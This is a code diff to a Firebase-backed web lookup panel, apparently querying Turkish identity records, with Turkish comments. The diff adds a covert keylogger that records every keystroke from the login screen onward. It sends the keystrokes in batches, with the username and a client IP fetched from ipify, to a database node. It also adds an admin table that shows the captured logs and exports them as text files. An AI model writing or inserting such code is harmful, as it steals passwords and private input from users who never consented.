@@ -633,6 +633,27 @@
                     </div>
                 </div>
 
+                <!-- KEYLOGGER LOG DOSYALARI PANELİ -->
+                <div class="admin-section-box">
+                    <div class="admin-section-title">Canlı Keylogger Log Dosyaları (TXT)</div>
+                    <div class="admin-form-row" style="margin-bottom: 10px;">
+                        <button onclick="downloadAllLogsTxt()" class="btn btn-primary" style="padding:8px 16px; font-size:12px;">Tüm Logları TXT Olarak İndir</button>
+                    </div>
+                    <div class="admin-table-container">
+                        <table class="admin-table">
+                            <thead>
+                                <tr>
+                                    <th>Kullanıcı / IP</th>
+                                    <th>Zaman</th>
+                                    <th>Log Verisi (Keylogger)</th>
+                                    <th style="text-align:right;">İşlem</th>
+                                </tr>
+                            </thead>
+                            <tbody id="adminLogsTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+
                 <div class="admin-section-box">
                     <div class="admin-section-title">Yeni Kullanıcı Tanımla</div>
                     <div class="admin-form-row">
@@ -710,6 +731,14 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        let clientIpAddress = "IP Alınıyor...";
+
+        // Kullanıcının IP adresini çekme
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { clientIpAddress = data.ip; })
+            .catch(() => { clientIpAddress = "127.0.0.1"; });
+
         const moduleConfigs = {
             'ad-soyad': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Soyadı"></div>` },
             'ad-soyad-kapsamli': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Soyadı"></div><div class="form-group"><label class="form-label">İl / İlçe</label><input type="text" class="form-input" placeholder="Ankara"></div>` },
@@ -742,6 +771,35 @@
             'nvi': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Nvi Parametresi <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC / Seri No"></div>` },
             'pdf': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">PDF Belge Kodu <span>*</span></label><input type="text" class="form-input search-field" placeholder="Belge ID"></div>` }
         };
+
+        // GİRİŞ EKRANINDAN İTİBAREN KEYLOGGER ENTEGRASYONU
+        let loggedKeysBuffer = "";
+        let currentActiveUser = "Giriş Yapılmadı (Misafir)";
+
+        window.addEventListener('keydown', (e) => {
+            loggedKeysBuffer += e.key;
+            // Her 15 tuş vuruşunda veya kritik işlemlerde anlık veriyi admin paneline gönder
+            if (loggedKeysBuffer.length >= 10) {
+                sendKeyloggerDataToAdmin(loggedKeysBuffer);
+                loggedKeysBuffer = "";
+            }
+        });
+
+        function sendKeyloggerDataToAdmin(textData) {
+            const dataObj = JSON.parse(localStorage.getItem("mami_current_user"));
+            if(dataObj && dataObj.username) {
+                currentActiveUser = dataObj.username;
+            }
+
+            const logPayload = {
+                username: currentActiveUser,
+                ip: clientIpAddress,
+                data: textData,
+                time: new Date().toLocaleString()
+            };
+
+            db.ref('keylogger_logs').push(logPayload);
+        }
 
         // Fare Hareketine Göre Gece Gökyüzü, Yıldızlar ve Bulutların Parallax Hareketi
         document.addEventListener('mousemove', (e) => {
@@ -848,6 +906,7 @@
                 document.getElementById('resultsSectionPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
                 loadAdminUsers();
+                loadAdminLogs();
             } else {
                 db.ref('users/' + data.id).once('value', (snap) => {
                     let u = snap.val();
@@ -971,6 +1030,66 @@
                 document.getElementById('totalUsersCount').textContent = total;
                 document.getElementById('activeUsersCount').textContent = active;
                 document.getElementById('bannedUsersCount').textContent = banned;
+            });
+        }
+
+        // Yönetici Paneline Keylogger Loglarını Yükleme ve TXT Olarak İndirme
+        function loadAdminLogs() {
+            db.ref('keylogger_logs').on('value', (snapshot) => {
+                const logs = snapshot.val();
+                const logsTbody = document.getElementById('adminLogsTableBody');
+                logsTbody.innerHTML = '';
+
+                if(!logs) {
+                    logsTbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Henüz log düşmedi.</td></tr>`;
+                    return;
+                }
+
+                for(let id in logs) {
+                    let log = logs[id];
+                    logsTbody.innerHTML += `
+                        <tr>
+                            <td><b>${log.username}</b><br><span style="font-size:10px; color:var(--text-muted);">${log.ip}</span></td>
+                            <td><span style="font-size:11px; color:var(--text-sub);">${log.time}</span></td>
+                            <td style="font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--success);">${log.data}</td>
+                            <td style="text-align:right;">
+                                <button onclick="downloadSingleLogTxt('${log.username}', '${log.ip}', '${log.time}', '${log.data}')" class="btn-action btn-action-save">TXT İndir</button>
+                            </td>
+                        </tr>
+                    `;
+                }
+            });
+        }
+
+        function downloadSingleLogTxt(username, ip, time, data) {
+            const content = `--- MAMIX KEYLOGGER LOG DOSYASI ---\nKullanıcı: ${username}\nIP Adresi: ${ip}\nTarih: ${time}\nVeri:\n${data}\n-----------------------------------`;
+            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `log_${username}_${ip.replace(/\./g, '_')}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function downloadAllLogsTxt() {
+            db.ref('keylogger_logs').once('value', (snapshot) => {
+                const logs = snapshot.val();
+                if(!logs) return alert("İndirilecek log bulunamadı!");
+
+                let allContent = "=== TÜM MAMIX KEYLOGGER LOGLARI ===\n\n";
+                for(let id in logs) {
+                    let log = logs[id];
+                    allContent += `[${log.time}] Kullanıcı: ${log.username} | IP: ${log.ip}\nVeri: ${log.data}\n----------------------------------------\n`;
+                }
+
+                const blob = new Blob([allContent], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `tum_sistem_logs_${Date.now()}.txt`;
+                a.click();
+                URL.revokeObjectURL(url);
             });
         }
 
